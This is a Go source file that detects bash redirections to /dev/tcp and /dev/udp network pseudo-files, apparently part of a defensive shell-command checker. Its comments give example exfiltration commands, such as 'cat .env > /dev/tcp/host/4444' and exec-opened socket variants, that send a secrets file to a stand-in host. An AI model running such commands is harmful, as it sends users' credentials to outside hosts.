package shellcmd

import "strings"

// SocketRedirect is a redirection of a command to or from one of bash's network pseudo-files,
// /dev/tcp/host/port or /dev/udp/host/port: bash opens a connection instead of a file, so the
// command's output is sent to the host, or its input comes from it.
type SocketRedirect struct {
	// Path is the pseudo-file as written, without its quotes: /dev/tcp/host.example/4444, also
	// where the host or port depends on an expansion (/dev/tcp/$HOST/$PORT).
	Path string
	// Op is SocketWrite when the command's output goes to the host, SocketRead when its input
	// comes from it, and SocketReadWrite for a descriptor opened both ways (<>).
	Op SocketOp
}

// SocketOp is the direction of a socket redirection.
type SocketOp string

const (
	SocketWrite     SocketOp = "write"
	SocketRead      SocketOp = "read"
	SocketReadWrite SocketOp = "readwrite"
)

// SocketRedirects returns, for each command of a parsed command line, its redirections to or
// from a network pseudo-file. The result is parallel to commands, or nil when there is none.
//
// A command has one when a redirection of its own names the pseudo-file
// (`cat .env > /dev/tcp/host/4444`), and when it duplicates a descriptor that an earlier
// `exec` of the same shell opened on one (`exec 3<>/dev/tcp/host/4444; cat .env >&3`): the
// exec has the redirection that opens the connection, the later command the one that uses
// it, in the direction it uses it. A standard output or input the command does not redirect
// itself goes where the compound statement around it sends it (`{ cat .env; } >
// /dev/tcp/host/4444`), or else where a bare exec of its shell left it (`exec
// >/dev/tcp/host/4444; cat .env`): its output when it is the last stage of its pipeline, its
// input when it is the first. What an exec leaves open is open to the commands after it in its
// subshell or substitution, and in the subshells, substitutions and scripts inside that
// (`(exec 3>/dev/tcp/host/4444; (cat .env >&3))`), and not after the subshell or substitution
// ends; a descriptor whose number is not written as a number is not followed.
func SocketRedirects(commands []Command) [][]SocketRedirect {
	var out [][]SocketRedirect
	// open are the descriptors bare execs redirected, in the order they ran.
	var open []openDescriptor
	for i := range commands {
		c := &commands[i]
		// Only a bare exec's redirections outlast the command.
		keeps := len(c.Argv) == 1 && c.Argv[0].Known && c.Argv[0].Text == "exec"
		for _, r := range c.Redirects {
			found := SocketRedirect{Op: SocketWrite}
			switch r.Op {
			case ">", ">>", ">|", "&>", "&>>":
			case "<":
				found.Op = SocketRead
			case "<>":
				found.Op = SocketReadWrite
			case ">&", "<&":
				if r.Op == "<&" {
					found.Op = SocketRead
				}
			default:
				continue // a here-document or a here-string
			}
			target := r.Target.Unquoted
			if number, isNumber := descriptorNumber(target); (r.Op == ">&" || r.Op == "<&") && (isNumber || target == "-") {
				// A duplicated descriptor is the socket an exec opened it on.
				found.Path = openOn(commands, open, i, number)
			} else if isSocketPath(target) {
				found.Path = target
			}
			if keeps {
				// An empty path closes the descriptor, or says it now names something else.
				open = append(open, openDescriptor{shell: c.shell, fd: descriptor(r), from: c.Offset, to: c.execEnd, path: found.Path})
			}
			if found.Path == "" {
				continue
			}
			if out == nil {
				out = make([][]SocketRedirect, len(commands))
			}
			out[i] = append(out[i], found)
		}
		if keeps || len(c.Argv) == 0 {
			continue
		}
		for _, std := range [...]struct {
			fd string
			op SocketOp
		}{{"1", SocketWrite}, {"0", SocketRead}} {
			if redirectsDescriptor(c, std.fd) {
				continue
			}
			path, decided := compoundSocket(commands, i, std.fd)
			// What a substitution's commands write is the substitution's value, not the stream.
			if !decided && (std.fd == "1" && c.within == 0 && isLastStage(commands, i) || std.fd == "0" && c.Stage == 0) {
				path = openOn(commands, open, i, std.fd)
			}
			if path == "" {
				continue
			}
			if out == nil {
				out = make([][]SocketRedirect, len(commands))
			}
			out[i] = append(out[i], SocketRedirect{Path: path, Op: std.op})
		}
	}
	return out
}

// openDescriptor is a descriptor a bare exec redirected: in the shell that ran it (shell, as
// Command.shell), from the exec's offset to the end of its subshell or substitution (to, 0 for
// none), on the network pseudo-file path, or on no socket when path is empty.
type openDescriptor struct {
	shell    int32
	fd       string
	from, to int
	path     string
}

// openOn returns the socket descriptor fd is open on for command i, as the execs before it left
// it: the last one that redirected fd where i runs, in i's own shell, or else in the shell that
// started it, and so on out to the command line. In a shell that started i's, i runs where that
// shell's command (the bash -c of the script i is in) does.
func openOn(commands []Command, open []openDescriptor, i int, fd string) string {
	if len(open) == 0 {
		return ""
	}
	shell, at := commands[i].shell, commands[i].Offset
	for {
		for k := len(open) - 1; k >= 0; k-- {
			if o := &open[k]; o.shell == shell && o.fd == fd && o.from < at && (o.to == 0 || at < o.to) {
				return o.path
			}
		}
		if shell == 0 {
			return ""
		}
		runner := &commands[shell-1]
		shell, at = runner.shell, runner.Offset
	}
}

// redirectsDescriptor reports whether c redirects descriptor fd itself.
func redirectsDescriptor(c *Command, fd string) bool {
	for _, r := range c.Redirects {
		if descriptor(r) == fd || fd == "1" && (r.Op == "&>" || r.Op == "&>>") {
			return true
		}
	}
	return false
}

// compoundSocket returns the socket the compound statements around command i send its
// descriptor fd to, and whether one of them decides where fd goes at all: the innermost that
// redirects it does. Only a statement of the compound itself, or the last stage of a pipeline
// inside it, writes to the compound's standard output, and only a first stage reads its input.
func compoundSocket(commands []Command, i int, fd string) (path string, decided bool) {
	c := &commands[i]
	for k := c.outer; k != 0; k = commands[k-1].outer {
		compound := &commands[k-1]
		if c.Pipeline != compound.Pipeline && (fd == "1" && !isLastStage(commands, i) || fd == "0" && c.Stage > 0) {
			return "", true // its own pipeline takes the descriptor
		}
		for _, r := range compound.Redirects {
			if descriptor(r) != fd && !(fd == "1" && (r.Op == "&>" || r.Op == "&>>")) {
				continue
			}
			if target := r.Target.Unquoted; isSocketPath(target) {
				return target, true
			}
			return "", true
		}
	}
	return "", false
}

// isLastStage reports whether no later stage of command i's pipeline takes its output.
func isLastStage(commands []Command, i int) bool {
	c := &commands[i]
	for k := range commands {
		if later := &commands[k]; later.Pipeline == c.Pipeline && later.Stage > c.Stage {
			return false
		}
	}
	return true
}

// descriptorNumber reads the target of >& or <& as a descriptor: digits, with the - that moves it.
func descriptorNumber(target string) (string, bool) {
	number := strings.TrimSuffix(target, "-")
	return number, number != "" && strings.Trim(number, "0123456789") == ""
}

// descriptor is the descriptor a redirection is of: the one written before the operator, or
// the operator's own (standard input for < and <>, standard output otherwise).
func descriptor(r Redirect) string {
	switch {
	case r.Fd != "":
		return r.Fd
	case strings.HasPrefix(r.Op, "<"):
		return "0"
	}
	return "1"
}

// isSocketPath reports whether a redirection's target, as written, is a network pseudo-file.
func isSocketPath(target string) bool {
	rest, ok := strings.CutPrefix(target, "/dev/tcp/")
	if !ok {
		rest, ok = strings.CutPrefix(target, "/dev/udp/")
	}
	return ok && rest != ""
}
